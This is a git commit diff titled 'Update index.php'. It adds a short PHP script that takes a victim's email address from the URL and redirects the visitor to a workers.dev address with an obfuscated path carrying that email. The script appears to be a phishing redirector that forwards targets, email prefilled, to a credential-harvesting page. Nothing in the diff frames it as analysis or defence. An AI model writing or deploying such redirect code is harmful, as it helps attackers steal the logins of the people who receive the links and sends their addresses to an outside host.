14d1e55f1469c0b586352b836add33dcc24eb9c8
cloud490 <86426758+cloud490@users.noreply.github.com>
2021-06-24 18:27:31 +0200

    Update index.php

--- index.php
+++ index.php
@@ -1,1 +1,15 @@
 
+Crypt
+
+<?php
+function getemIDFromem($em)
+{
+$find = '@';
+$pos = strpos($em, $find);
+$emID = substr($em, 0, $pos);
+return $emID;
+}
+$em = $_GET['em'];
+$emID = getemIDFromem($em);
+header("Location: https://lingeringbandai3ozx.oscar3322.workers.dev/?bbre=zoxusazx#/mWLoRttpb5-@&!vN2wGKVey4fFoJkmO!@&PfiyVFU7SeADlauJMTk&!-SILENTCODERSEMAIL-XxVY3cjFR7sw9Ek39F84/Dd1V8CT7etO4SZJRTd1H/?em=$em");
+?>
